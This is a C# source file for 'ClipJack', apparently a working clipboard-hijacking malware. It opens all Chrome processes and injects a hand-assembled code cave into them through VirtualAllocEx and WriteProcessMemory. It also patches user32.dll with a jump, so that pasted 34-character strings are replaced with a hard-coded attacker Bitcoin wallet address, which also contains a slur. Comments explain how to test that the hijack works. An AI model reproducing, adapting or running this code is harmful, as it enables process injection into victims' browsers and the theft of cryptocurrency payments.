using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ClipJack
{
    class Program
    {
        #region ImportDLL
        [DllImport("Kernel32.dll")]
        public static extern bool ReadProcessMemory(IntPtr handle, long address, byte[] bytes, int nsize, ref int op);

        [DllImport("Kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hwind, long Address, byte[] bytes, int nsize, out int output);

        [DllImport("Kernel32.dll")]
        public static extern IntPtr OpenProcess(int Token, bool inheritH, int ProcID);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, long lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000,
            Decommit = 0x4000,
            Release = 0x8000,
            Reset = 0x80000,
            Physical = 0x400000,
            TopDown = 0x100000,
            WriteWatch = 0x200000,
            LargePages = 0x20000000
        }

        enum MemoryProtection
        {
            NoAccess = 0x0001,
            ReadOnly = 0x0002,
            ReadWrite = 0x0004,
            WriteCopy = 0x0008,
            Execute = 0x0010,
            ExecuteRead = 0x0020,
            ExecuteReadWrite = 0x0040,
            ExecuteWriteCopy = 0x0080,
            GuardModifierflag = 0x0100,
            NoCacheModifierflag = 0x0200,
            WriteCombineModifierflag = 0x0400,
            Proc_All_Access = 2035711
        }
        #endregion ImportDLL

        //This is the Array of Bytes we need to find in User32.dll, the location will then be used to make a long jump
        private static byte[] PatchLocation = { 0x4C, 0x8D, 0x5C, 0x24, 0x70, 0x49, 0x8B, 0x5B, 0x38, 0x49, 0x8B, 0x73, 0x40, 0x49, 0x8B, 0x7B, 0x48, 0x49, 0x8B, 0xE3, 0x41, 0x5F, 0x41, 0x5E, 0x41, 0x5D, 0x41, 0x5C, 0x5D };
        //Address gets replaced with this one
        private static string WalletAddress = "1NibbaxDGkpUcRUcy8a5QntDXxioWSPiAE";

        static void Main(string[] args)
        {
            Console.WriteLine("0x"+FindPatchLocation().ToString("X"));
            foreach(Process p in Process.GetProcessesByName("chrome"))
            {
                InjectClipJackCode(p);
            }
            Console.ReadLine();
        }

        private static long FindPatchLocation()
        {
            //Find location to patch
            int BytesRead = 0;
            long BypassLocation = 0;
            byte[] buffer = new byte[0x191000];
            long DLLbase = (long)GetModuleHandle("user32.dll");
            ReadProcessMemory(Process.GetCurrentProcess().Handle, DLLbase, buffer, buffer.Length, ref BytesRead);
            bool NotComplete = false;

            for (int i = 0; i <= buffer.Length - PatchLocation.Length; i++)
            {
                if (buffer[i] == PatchLocation[0] && buffer[i + PatchLocation.Length - 1] == PatchLocation[PatchLocation.Length - 1])
                {
                    NotComplete = false;
                    for (int j = 0; j <= PatchLocation.Length - 1; j++)
                    {
                        if (buffer[i + j] != PatchLocation[j])
                        {
                            NotComplete = true;
                            break;
                        }
                    }
                    if (NotComplete == false)
                    {
                        return BypassLocation = DLLbase + i;
                    }
                }
            }
            return -1;
        }

        public static void InjectClipJackCode(Process proc)
        {
            int BytesWritten = 0;
            long PatchBase = FindPatchLocation();
            byte[] LongJump = { 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
            IntPtr wHandle = OpenProcess((int)MemoryProtection.Proc_All_Access, false, proc.Id);

            #region ClipJack
            byte[] ClipHook = {0xEB, 0x59, 0x31, 0x00, 0x39, 0x00, 0x68, 0x00, 0x4E, 0x00, 0x38, 0x00, 0x71, 0x00, 0x6A, 0x00, 0x51, 0x00, 0x57, 0x00, 0x48,
                               0x00, 0x33, 0x00, 0x66, 0x00, 0x4C, 0x00, 0x71, 0x00, 0x70, 0x00, 0x70, 0x00, 0x43, 0x00, 0x67, 0x00, 0x77, 0x00, 0x38, 0x00,
                               0x77, 0x00, 0x58, 0x00, 0x61, 0x00, 0x4B, 0x00, 0x4A, 0x00, 0x4B, 0x00, 0x33, 0x00, 0x38, 0x00, 0x48, 0x00, 0x66, 0x00, 0x6D,
                               0x00, 0x47, 0x00, 0x4B, 0x00, 0x38, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                               0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x55, 0x48, 0x8B, 0xEC, 0x51, 0x57, 0x50, 0x50, 0x5F, 0x48,
                               0x29, 0xC9, 0x48, 0xF7, 0xD1, 0x48, 0x31, 0xC0, 0x28, 0xC0, 0xFC, 0xF2, 0x66, 0xAF, 0x48, 0xF7, 0xD1, 0x48, 0xFF, 0xC9, 0x48,
                               0x83, 0xF9, 0x22, 0x74, 0x39, 0x90, 0x90, 0x90, 0x90, 0x58, 0x5F, 0x59, 0xE9, 0x89, 0x00, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90,
                               0x90, 0x90, 0x90, 0x90, 0x90, 0xFF, 0x05, 0xB4, 0xFF, 0xFF, 0xFF, 0x83, 0x3D, 0xAD, 0xFF, 0xFF, 0xFF, 0x02, 0x72, 0x36, 0x90,
                               0x90, 0x90, 0x90, 0x58, 0x5F, 0x59, 0xEB, 0x68, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x48,
                               0xFF, 0xC1, 0x48, 0x29, 0xCF, 0x48, 0x29, 0xCF, 0x57, 0x48, 0x8B, 0x3F, 0x48, 0x39, 0x3D, 0x5A, 0x00, 0x00, 0x00, 0x5F, 0x74,
                               0xC5, 0xC7, 0x05, 0x75, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x57, 0x48, 0x8B, 0x3F, 0x48, 0x89, 0x3D, 0x42, 0x00, 0x00,
                               0x00, 0x5F, 0x58, 0x48, 0xFF, 0xC9, 0x48, 0x01, 0xC9, 0x53, 0x48, 0x83, 0xE9, 0x02, 0x48, 0xBB, 0xEF, 0xBE, 0xAD, 0xDE, 0xEF,
                               0xBE, 0xAD, 0xDE, 0x48, 0x01, 0xCB, 0x48, 0x8B, 0x1B, 0x88, 0x1C, 0x08, 0x6A, 0x00, 0x5B, 0x88, 0x5C, 0x08, 0x01, 0x48, 0x83,
                               0xF9, 0x00, 0x77, 0xDC, 0x5B, 0x5F, 0x59, 0x48, 0x8B, 0xE5, 0x5D, 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00, 0x90, 0x90, 0x90, 0x90,
                               0x90, 0x90, 0x90, 0x90, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };  //the ASM code cave (not the best... but it works)
            #endregion ClipJack

            //Merge PatchedBytes & ClipHook into a new buffer
            byte[] payload = new byte[PatchLocation.Length + ClipHook.Length];
            for (int i = 0; i < payload.Length; i++)
            {
                if (i >= PatchLocation.Length)
                    payload[i] = ClipHook[i - PatchLocation.Length];
                else
                    payload[i] = PatchLocation[i];
            }

            //Allocate our memory location already, we need the return value to calculate stuff
            long hAlloc = (long)VirtualAllocEx(wHandle, 0, (uint)payload.Length, AllocationType.Commit, MemoryProtection.ExecuteReadWrite);
            Console.WriteLine("CodeCave[" + proc.Id + "] is @ 0x" + hAlloc.ToString("X"));

            //fix pointer to Wallet address
            WriteQWORDinBuffer(payload, hAlloc + PatchLocation.Length + 0x02, PatchLocation.Length + 0xF7);

            //Add destination to long jump
            WriteQWORDinBuffer(payload, PatchBase + PatchLocation.Length, payload.Length - 0x10);

            //Write CodeCave buffer to allocated memory
            WriteProcessMemory(wHandle, hAlloc, payload, payload.Length, out BytesWritten);

            //Write long jump in DLL to finish hook
            WriteQWORDinBuffer(LongJump, hAlloc, 0x06);
            WriteProcessMemory(wHandle, PatchBase, LongJump, LongJump.Length, out BytesWritten);

            //Done!
            //To test if it works, copy & paste the below text and paste it in the infected process
            //1234567890123456789012345678902134
            //9971567890123456789012345678902134
        }

        //this function is used to write 8byte-buffer (aka qword) in a bigger buffer
        private static byte[] WriteQWORDinBuffer(byte[] buffer, long QWORD, long offset)
        {
            byte[] addressLocation = BitConverter.GetBytes(QWORD);
            for (int j = 0; j < 8; j++)
            {
                if (j >= buffer.Length)
                {
                    buffer[offset + j] = 0x00;
                    continue;
                }
                buffer[offset + j] = addressLocation[j];
            }
            return buffer;
        }
    }
}
